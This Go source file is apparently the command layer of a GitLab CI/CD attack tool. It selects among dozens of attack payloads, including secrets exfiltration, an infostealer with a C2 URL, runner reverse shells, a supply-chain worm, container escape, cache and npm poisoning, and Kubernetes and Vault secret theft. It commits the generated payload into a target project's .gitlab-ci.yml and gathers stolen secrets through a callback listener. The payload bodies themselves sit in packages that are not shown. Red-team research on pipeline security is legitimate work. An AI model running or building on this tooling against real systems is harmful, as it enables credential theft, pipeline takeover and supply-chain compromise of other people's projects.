package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"maps"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	secdump "github.com/mr-pmillz/gogatoz/pkg/attack/secretsdump"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
)

// narrow interface to allow test fakes
type attackRunner interface {
	CommitCIPipeline(ctx context.Context, projectID any, branch, yamlContent, message string) (string, error)
}

type secretsRunner interface {
	RunExfil(ctx context.Context, projectID any, branch, pubkey string, runnerTags []string, exfil attack.ExfilOptions) (url, jobName string, err error)
}

var newAttacker = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) attackRunner {
	return attack.NewAttacker(gl, baseURL, authorName, authorEmail, timeout)
}

var newSecretsRunner = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) secretsRunner {
	att := attack.NewAttacker(gl, baseURL, authorName, authorEmail, timeout)
	return attack.NewSecretsAttack(att)
}

// Output structure for --secrets mode when --output-json is set.
type secretsOutput struct {
	PipelineURL      string                    `json:"pipeline_url"`
	JobID            int64                     `json:"job_id,omitempty"`
	JobStatus        string                    `json:"job_status,omitempty"`
	ExfilSecrets     map[string]string         `json:"exfil_secrets,omitempty"`
	ProjectVariables []secdump.Variable        `json:"project_variables,omitempty"`
	GroupVariables   []secdump.Variable        `json:"group_variables,omitempty"`
	LogFindings      []secdump.Finding         `json:"log_findings,omitempty"`
	ArtifactFindings []secdump.ArtifactFinding `json:"artifact_findings,omitempty"`
}

// ensureBranchDeconflict picks a branch name according to strategy and performs deletions for force.
func ensureBranchDeconflict(ctx context.Context, client *gitlabx.Client, projectID any, desired, strategy, authorName, authorEmail string) (string, error) {
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), authorName, authorEmail, 0)
	name := strings.TrimSpace(desired)
	if name == "" {
		name = gogatozAttack
	} //nolint:goconst
	st := strings.ToLower(strings.TrimSpace(strategy))
	if st == "" {
		st = "suffix"
	}
	exists, err := att.BranchExists(ctx, projectID, name)
	if err != nil {
		return "", err
	}
	switch st {
	case "fail":
		if exists {
			return "", fmt.Errorf("branch %s already exists (use --deconflict)", name)
		}
		return name, nil
	case "force":
		if exists {
			if err := att.DeleteBranch(ctx, projectID, name); err != nil {
				return "", fmt.Errorf("delete branch: %w", err)
			}
		}
		return name, nil
	case "suffix":
		if !exists {
			return name, nil
		}
		for i := 1; i <= attack.MaxDeconflictSuffix; i++ {
			cand := fmt.Sprintf("%s-%d", name, i)
			e, err := att.BranchExists(ctx, projectID, cand)
			if err != nil {
				return "", err
			}
			if !e {
				return cand, nil
			}
		}
		return "", fmt.Errorf("could not find available suffix for %s", name)
	default:
		return "", fmt.Errorf("unknown --deconflict strategy: %s", strategy)
	}
}

func loadCIContent(inline, file string, fromStdin bool) (string, error) {
	if strings.TrimSpace(inline) != "" {
		// Interpret common escape sequences so users can pass YAML
		// on a single line: --ci-yaml 'stages:\n  - test\n...'
		s := strings.ReplaceAll(inline, `\n`, "\n")
		s = strings.ReplaceAll(s, `\t`, "\t")
		return s, nil
	}
	if strings.TrimSpace(file) != "" {
		b, err := os.ReadFile(filepath.Clean(file)) //nolint:gosec // G703: file path provided by user via CLI flag
		if err != nil {
			return "", err
		}
		return string(b), nil
	}
	if fromStdin {
		b, err := ioReadAll(os.Stdin)
		if err != nil {
			return "", err
		}
		return string(b), nil
	}
	return "", nil
}

// small indirection for testing stdin reads
var ioReadAll = func(f *os.File) ([]byte, error) { return io.ReadAll(f) }

// renderPayload builds a payload YAML based on selected flags.
func renderPayload() (string, error) {
	p := strings.ToLower(strings.TrimSpace(atkPayload))
	// Build common options
	var tags []string
	if strings.TrimSpace(atkTags) != "" {
		for t := range strings.SplitSeq(atkTags, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	common := payloadgen.CommonOptions{
		JobName:         strings.TrimSpace(atkJobName),
		Stage:           strings.TrimSpace(atkStage),
		Image:           strings.TrimSpace(atkImage),
		Tags:            tags,
		Manual:          atkManual,
		ArtifactsPath:   strings.TrimSpace(atkArtifactsPath),
		ArtifactsExpire: strings.TrimSpace(atkArtifactsExpire),
	}
	switch p {
	case "ror-shell":
		return payloadgen.GenerateRORShellYAML(payloadgen.RORShellOptions{
			Common:       common,
			Command:      atkCmd,
			DownloadPath: atkDownload,
		}), nil
	case payloadPwnRequest:
		return payloadgen.GeneratePwnRequestYAML(payloadgen.PwnRequestOptions{
			Common:           common,
			TargetBranchExpr: strings.TrimSpace(atkTargetBranchRegex),
		}), nil
	case payloadRor, payloadRunnerOnRunner, payloadRunnerOnRunnerAlt:
		return payloadgen.GenerateRunnerOnRunnerYAML(payloadgen.RunnerOnRunnerOptions{
			Common:           common,
			ScriptURL:        strings.TrimSpace(atkScriptURL),
			TargetOS:         strings.TrimSpace(atkOS),
			KeepAliveSeconds: atkKeepAlive,
		}), nil
	case payloadNestedRunner:
		return payloadgen.GenerateNestedRunnerYAML(payloadgen.NestedRunnerOptions{
			Common:            common,
			AttackerGitLabURL: strings.TrimSpace(atkNestedGitLabURL),
			RegistrationToken: strings.TrimSpace(atkNestedRegToken),
			RunnerName:        strings.TrimSpace(atkNestedName),
			RunnerTags:        strings.TrimSpace(atkNestedTags),
			Executor:          strings.TrimSpace(atkNestedExecutor),
			CallbackURL:       strings.TrimSpace(atkNestedCallback),
			RunnerVersion:     strings.TrimSpace(atkNestedVersion),
		}), nil
	case "secrets", "secrets-exfil", "secrets_exfil":
		return payloadgen.GenerateSecretsExfilYAML(payloadgen.SecretsExfilOptions{
			Common:      common,
			WebhookURL:  strings.TrimSpace(atkWebhook),
			ExfilMethod: strings.TrimSpace(atkExfilMethod),
			ExfilTarget: strings.TrimSpace(atkExfilTarget),
		}), nil
	case "git-hook", "git_hook", "githook":
		return payloadgen.GenerateGitHookYAML(payloadgen.GitHookOptions{
			Common:      common,
			CallbackURL: strings.TrimSpace(atkWebhook),
			HookType:    strings.TrimSpace(atkHookType),
		}), nil
	case "cache-poison", "cache_poison", "cachepoison":
		return payloadgen.GenerateCachePoisonYAML(payloadgen.CachePoisonOptions{
			Common:    common,
			CacheKey:  strings.TrimSpace(atkCacheKey),
			CachePath: strings.TrimSpace(atkCachePath),
			PoisonCmd: strings.TrimSpace(atkPoisonCmd),
		}), nil
	case "infostealer", "info-stealer", "info_stealer":
		c2 := strings.TrimSpace(atkTamperTagC2)
		if c2 == "" {
			c2 = strings.TrimSpace(atkWebhook)
		}
		if c2 == "" {
			c2 = "https://example.invalid/callback"
		}
		return payloadgen.GenerateInfostealerScript(payloadgen.InfostealerOptions{
			C2URL:           c2,
			EncryptionKey:   strings.TrimSpace(atkTamperTagEncKey),
			BackupExfilRepo: strings.TrimSpace(atkTamperTagBackup),
			ProcScan:        atkTamperTagProcScan,
			MemoryDump:      atkTamperTagMemDump,
			Extended:        atkTamperTagExtended,
		}), nil
	case "memory-dump", "memory_dump", "memorydump":
		c2 := strings.TrimSpace(atkWebhook)
		return payloadgen.GenerateMemoryDumpYAML(payloadgen.MemoryDumpOptions{
			Common:      common,
			CallbackURL: c2,
			ProcScan:    true,
			MemoryDump:  true,
			Extended:    true,
		}), nil
	case "supplychain-worm", "supplychain_worm", "supplychainworm":
		return payloadgen.GenerateSupplyChainWormYAML(payloadgen.SupplyChainWormOptions{
			Common:      common,
			CallbackURL: strings.TrimSpace(atkWebhook),
			ExfilMethod: strings.TrimSpace(atkExfilMethod),
			ExfilTarget: strings.TrimSpace(atkExfilTarget),
		}), nil
	case "container-escape", "container_escape", "containerescape":
		return payloadgen.GenerateContainerEscapeYAML(payloadgen.ContainerEscapeOptions{
			Common:       common,
			EscapeMethod: strings.TrimSpace(atkEscapeMethod),
			EscapeCmd:    strings.TrimSpace(atkEscapeCommand),
			MountPath:    strings.TrimSpace(atkEscapeMountPath),
			HostCommand:  strings.TrimSpace(atkCmd),
			ExfilMethod:  strings.TrimSpace(atkExfilMethod),
			ExfilTarget:  strings.TrimSpace(atkExfilTarget),
		}), nil
	case "variable-inject", "variable_inject", "variableinject", "var-inject":
		return payloadgen.GenerateVariableInjectionYAML(payloadgen.VariableInjectionOptions{
			Common:      common,
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "c2-channels", "c2_channels", "c2channels", "c2-channel", "c2channel":
		return payloadgen.GenerateC2ChannelYAML(payloadgen.C2ChannelOptions{
			Common:      common,
			ExfilMethod: strings.TrimSpace(atkC2Method),
			ExfilTarget: strings.TrimSpace(atkC2Target),
			KeepAlive:   atkC2KeepAlive,
			CallbackURL: strings.TrimSpace(atkC2CallbackURL),
		}), nil
	case "npm-tamper", "npm_tamper", "npmtamper":
		return payloadgen.GenerateNpmTamperYAML(payloadgen.NpmTamperOptions{
			Common:         common,
			RegistryURL:    strings.TrimSpace(atkNpmRegistry),
			PackageName:    strings.TrimSpace(atkNpmPackage),
			InjectedScript: strings.TrimSpace(atkNpmInjectScript),
			CallbackURL:    strings.TrimSpace(atkWebhook),
		}), nil
	case "vault-enum", "vault_enum", "vaultenum":
		return payloadgen.GenerateVaultEnumYAML(payloadgen.VaultEnumOptions{
			Common:      common,
			VaultAddr:   strings.TrimSpace(atkVaultAddr),
			AuthMethod:  strings.TrimSpace(atkVaultAuthMethod),
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "k8s-secrets", "k8s_secrets", "k8ssecrets":
		var ns []string
		if s := strings.TrimSpace(atkK8sNamespaces); s != "" {
			for n := range strings.SplitSeq(s, ",") {
				n = strings.TrimSpace(n)
				if n != "" {
					ns = append(ns, n)
				}
			}
		}
		return payloadgen.GenerateK8sSecretsYAML(payloadgen.K8sSecretsOptions{
			Common:      common,
			Namespaces:  ns,
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "dead-mans-switch", "dead_mans_switch", "deadmanswitch", "dms":
		return payloadgen.GenerateDeadManSwitchYAML(payloadgen.DeadManSwitchOptions{
			Common:        common,
			MonitorURL:    strings.TrimSpace(atkDMSMonitorURL),
			CheckInterval: strings.TrimSpace(atkDMSInterval),
			TTL:           strings.TrimSpace(atkDMSTTL),
			Handler:       strings.TrimSpace(atkDMSHandler),
			Platform:      strings.TrimSpace(atkDMSPlatform),
		}), nil
	case "branch-mutator", "branch_mutator", "branchmutator":
		return payloadgen.GenerateBranchMutatorYAML(payloadgen.BranchMutatorOptions{
			Common:      common,
			FilePath:    strings.TrimSpace(atkMutatorFile),
			FileContent: strings.TrimSpace(atkMutatorContent),
			MaxBranches: atkMutatorMaxBranches,
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "sigstore", "sigstore-provenance":
		return payloadgen.GenerateSigstoreYAML(payloadgen.SigstoreOptions{
			Common:      common,
			PackageName: strings.TrimSpace(atkSigstorePackage),
			Version:     strings.TrimSpace(atkSigstoreVersion),
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "workflow-exfil", "workflow_exfil", "workflowexfil":
		return payloadgen.GenerateWorkflowExfilYAML(payloadgen.WorkflowExfilOptions{
			Common:        common,
			DisguiseName:  strings.TrimSpace(atkExfilDisguise),
			WebhookURL:    strings.TrimSpace(atkWebhook),
			DumpGroupVars: atkExfilDumpGroupVar,
		}), nil
	case "commit-prefix", "commit_prefix", "commitprefix":
		return payloadgen.GenerateCommitPrefixYAML(payloadgen.CommitPrefixYAMLOptions{
			Common: common,
			Prefix: payloadgen.CommitPrefixOptions{
				Prefix:  strings.TrimSpace(atkPrefixValue),
				Message: strings.TrimSpace(atkPrefixMessage),
			},
		}), nil
	case "release-tamper-pipeline", "release_tamper_pipeline", "releasetamperpipeline":
		return payloadgen.GenerateReleaseTamperPipelineYAML(payloadgen.ReleaseTamperPipelineOptions{
			Common:         common,
			ReleaseTag:     strings.TrimSpace(atkRTPTag),
			ArtifactPath:   strings.TrimSpace(atkRTPArtifact),
			PayloadContent: strings.TrimSpace(atkRTPPayload),
			ChecksumFile:   strings.TrimSpace(atkRTPChecksums),
			WebhookURL:     strings.TrimSpace(atkWebhook),
		}), nil
	case "pre-get-sources", "pre_get_sources", "pregetsources":
		return payloadgen.GeneratePreGetSourcesYAML(payloadgen.PreGetSourcesOptions{
			Common:       common,
			HookScript:   strings.TrimSpace(atkCmd),
			CallbackURL:  strings.TrimSpace(atkWebhook),
			ModifyGitURL: strings.TrimSpace(atkScriptURL),
		}), nil
	case "cache-key-poison", "cache_key_poison", "cachekeypoison":
		var keyFiles []string
		if s := strings.TrimSpace(atkCacheKeyFiles); s != "" {
			for f := range strings.SplitSeq(s, ",") {
				f = strings.TrimSpace(f)
				if f != "" {
					keyFiles = append(keyFiles, f)
				}
			}
		}
		return payloadgen.GenerateCacheKeyPoisonYAML(payloadgen.CacheKeyPoisonOptions{
			Common:    common,
			KeyPrefix: strings.TrimSpace(atkCacheKeyPrefix),
			KeyFiles:  keyFiles,
			PoisonCmd: strings.TrimSpace(atkPoisonCmd),
		}), nil
	case "parallel-matrix", "parallel_matrix", "parallelmatrix":
		var matrixVars map[string][]string
		if s := strings.TrimSpace(atkMatrixVars); s != "" {
			if err := json.Unmarshal([]byte(s), &matrixVars); err != nil {
				return "", fmt.Errorf("--matrix-vars: %w", err)
			}
		}
		return payloadgen.GenerateParallelMatrixYAML(payloadgen.ParallelMatrixOptions{
			Common:      common,
			MatrixVars:  matrixVars,
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "interruptible", "interruptible-attack", "interruptible_attack":
		return payloadgen.GenerateInterruptibleAttackYAML(payloadgen.InterruptibleOptions{
			Common:         common,
			FallbackScript: strings.TrimSpace(atkCmd),
		}), nil
	case "oidc-federation", "oidc_federation", "oidcfederation", "oidc":
		return payloadgen.GenerateOIDCFederationYAML(payloadgen.OIDCFederationOptions{
			Common:      common,
			Provider:    strings.TrimSpace(atkOIDCProvider),
			RoleARN:     strings.TrimSpace(atkOIDCRoleARN),
			Audience:    strings.TrimSpace(atkOIDCAudience),
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "artifact-reports", "artifact_reports", "artifactreports":
		return payloadgen.GenerateArtifactReportsYAML(payloadgen.ArtifactReportsOptions{
			Common:      common,
			ReportType:  strings.TrimSpace(atkReportType),
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "image-poison", "image_poison", "imagepoison":
		var svcCmd []string
		if s := strings.TrimSpace(atkServiceCommand); s != "" {
			for c := range strings.SplitSeq(s, ",") {
				c = strings.TrimSpace(c)
				if c != "" {
					svcCmd = append(svcCmd, c)
				}
			}
		}
		return payloadgen.GenerateImagePoisonYAML(payloadgen.ImagePoisonOptions{
			Common:         common,
			MaliciousImage: strings.TrimSpace(atkMaliciousImage),
			ServiceCommand: svcCmd,
		}), nil
	case "remote-include-cache", "remote_include_cache", "remoteincludecache":
		return payloadgen.GenerateRemoteIncludeCacheYAML(payloadgen.RemoteIncludeCacheOptions{
			Common:      common,
			RemoteURL:   strings.TrimSpace(atkRemoteURL),
			CacheTTL:    strings.TrimSpace(atkCacheTTL),
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "workflow-vars", "workflow_vars", "workflowvars":
		var wfVars map[string]string
		if s := strings.TrimSpace(atkWorkflowVars); s != "" {
			if err := json.Unmarshal([]byte(s), &wfVars); err != nil {
				return "", fmt.Errorf("--workflow-vars: %w", err)
			}
		}
		return payloadgen.GenerateWorkflowRulesVarsYAML(payloadgen.WorkflowRulesVarsOptions{
			Common:    common,
			Variables: wfVars,
		}), nil
	case "spec-inputs", "spec_inputs", "specinputs":
		return payloadgen.GenerateSpecInputsInjectionYAML(payloadgen.SpecInputsOptions{
			Common:         common,
			MaliciousValue: strings.TrimSpace(atkCmd),
		}), nil
	case "trigger-artifact", "trigger_artifact", "triggerartifact":
		return payloadgen.GenerateTriggerArtifactYAML(payloadgen.TriggerArtifactOptions{
			Common:         common,
			TriggerProject: strings.TrimSpace(atkTriggerProject),
		}), nil
	case "rules-bypass", "rules_bypass", "rulesbypass":
		return payloadgen.GenerateRulesBypassYAML(payloadgen.RulesBypassOptions{
			Common: common,
		}), nil
	case "needs-project", "needs_project", "needsproject":
		return payloadgen.GenerateNeedsProjectYAML(payloadgen.NeedsProjectOptions{
			Common:        common,
			SourceProject: strings.TrimSpace(atkSourceProject),
		}), nil
	default:
		return "", fmt.Errorf("unsupported --payload: %s", atkPayload)
	}
}

// newRorShellListener creates a new ror listener instance.
func newRorShellListener(listenAddr string, out io.Writer) *Listener {
	return NewListener(listenAddr, out)
}

// resultsToMap converts listener results to a map of maps for DB persistence.
func resultsToMap(results []*CallbackResult) map[string]string {
	combined := make(map[string]string)
	for _, r := range results {
		maps.Copy(combined, r.Secrets)
	}
	return combined
}

// parsePipelineURL extracts the pipeline ID from a GitLab pipeline URL string.
// URL format: https://gitlab.com/group/project/-/pipelines/123
func parsePipelineURL(pipelineURL string) (int64, error) {
	parts := strings.Split(pipelineURL, "/")
	for i := len(parts) - 1; i >= 0; i-- {
		if parts[i] == "pipelines" && i+1 < len(parts) {
			var id int64
			_, err := fmt.Sscanf(parts[i+1], "%d", &id)
			return id, err
		}
	}
	return 0, nil
}

// parseTags splits a comma-separated tag string into a slice.
func parseTags(raw string) []string {
	var tags []string
	if strings.TrimSpace(raw) != "" {
		for t := range strings.SplitSeq(raw, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	return tags
}

// commitPayloadToBranch handles the common pattern of: deconflict branch ->
// create attacker -> setup user -> ensure branch -> upsert .gitlab-ci.yml.
// Returns the resolved branch name on success.
func commitPayloadToBranch(ctx context.Context, client *gitlabx.Client, target, branch, deconflict, authorName, authorEmail, message, yaml string) (string, error) {
	finalBranch, err := ensureBranchDeconflict(ctx, client, target, branch, deconflict, authorName, authorEmail)
	if err != nil {
		return "", err
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), authorName, authorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return "", fmt.Errorf("setup user: %w", err)
	}
	if err := att.EnsureBranch(ctx, target, finalBranch); err != nil {
		return "", err
	}
	if err := att.UpsertFile(ctx, target, finalBranch, ".gitlab-ci.yml", yaml, message); err != nil {
		return "", err
	}
	return finalBranch, nil
}

// ifErr returns err.Error() or empty string -- used inline in variable-inject JSON output.
func ifErr(err error) string {
	if err != nil {
		return err.Error()
	}
	return ""
}
